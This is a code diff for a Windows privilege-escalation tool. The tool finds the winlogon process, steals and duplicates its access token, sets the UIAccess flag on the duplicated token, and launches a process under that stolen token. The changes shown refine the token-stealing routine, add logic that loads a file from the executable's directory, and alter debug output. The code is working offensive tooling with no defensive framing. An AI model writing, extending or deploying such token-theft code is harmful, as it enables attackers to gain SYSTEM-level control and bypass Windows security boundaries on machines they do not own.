@@ -141,6 +141,7 @@ void GetTokenInfo(HANDLE TokenHandle)
     _stprintf_s(szOutput, sizeof(szOutput) / sizeof(TCHAR), _T("[+] Current SID: %s\\%s @ %s\n"), szDomainName, szGroupName, sid.c_str());
     OutputDebugString(szOutput);
 }
+
 //void GetTokenInfo(HANDLE TokenHandle)
 //{
 //    LPVOID TokenInformation = NULL;
@@ -417,7 +418,7 @@ BOOL StealToken(int TargetPID, HANDLE *outHandle)
 
     OutputDebugStringA("[+] Impersonated the TOKEN's user");
 
-    Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);
+    Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &NewToken);
 
     if (!Duplicate)
     {
@@ -426,11 +427,34 @@ BOOL StealToken(int TargetPID, HANDLE *outHandle)
     }
 
     OutputDebugStringA("[+] Duplicated the target TOKEN");
-    *outHandle = NewToken;
+    bool result = false;
+    
+    DWORD v24 = 1;
+    if (SetTokenInformation(NewToken, TokenUIAccess, &v24, 4u)) {
+        *outHandle = NewToken;
+        result = true;
+    }
+    else result = false;
     //CreateImpersonatedProcess(NewToken);
-    return true;
     CloseHandle(hProcess);
     CloseHandle(TokenHandle);
+    return result;
+}
+
+void GetExecutableDirectory(char* outPath, size_t size) {
+    char exePath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+        // Strip the executable name to get the directory
+        char* lastSlash = strrchr(exePath, '\\');
+        if (lastSlash) {
+            *lastSlash = '\0'; // Null-terminate at the last slash
+            strncpy_s(outPath, size, exePath, _TRUNCATE);
+        }
+    }
+    else {
+        OutputDebugStringA("Failed to get executable path.");
+        outPath[0] = '\0';
+    }
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
@@ -455,6 +479,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     GetTokenInfo(hCurrentToken);
     if (GetTokenInformation(hCurrentToken, TokenUIAccess, &tokenInfo, 4u, &returnLen))
     {
+        char str[50];
+        sprintf_s(str, sizeof(str), "TokenInfo: %d", tokenInfo);
+        OutputDebugStringA(str);
         err = returnLen;
         v20 = 1;
     }
@@ -470,7 +497,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         else // __argc >= 2
         {
-            FILE* f = fopen(__argv[1], "rb");
+            char exeDir[MAX_PATH];
+            char fullPath[MAX_PATH];
+            // Get the executable directory
+            GetExecutableDirectory(exeDir, MAX_PATH);
+            snprintf(fullPath, MAX_PATH, "%s\\%s", exeDir, __argv[1]);
+
+            FILE* f = fopen(fullPath, "rb");
             if (!f)
             {
                 text = _wcsdup(L"ERROR: Can't open file");
@@ -489,15 +522,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     else {
         int winLogonPID = LocateWinLogonProcess();
         EnableSeTcpPrivilege();
-        char str[50];
-        sprintf_s(str, sizeof(str), "WinLogon PID : %d", winLogonPID);
-        OutputDebugStringA(str);
         if (StealToken(winLogonPID, &hNewToken)) {
             //OutputDebugStringA("Newly created token info: ");
             GetTokenInfo(hNewToken);
             GetStartupInfoW(&startupInfo);
             commandLine = GetCommandLineW();
-            MessageBox(NULL, "Creating new process with stolean token", "", MB_OK);
+            MessageBoxW(NULL, commandLine, L"", MB_OK);
             if (CreateProcessWithTokenW(hNewToken, LOGON_WITH_PROFILE, 0, commandLine, 0, NULL, NULL, &startupInfo, &processInformation)) {
                 CloseHandle(processInformation.hProcess);
                 CloseHandle(processInformation.hThread);
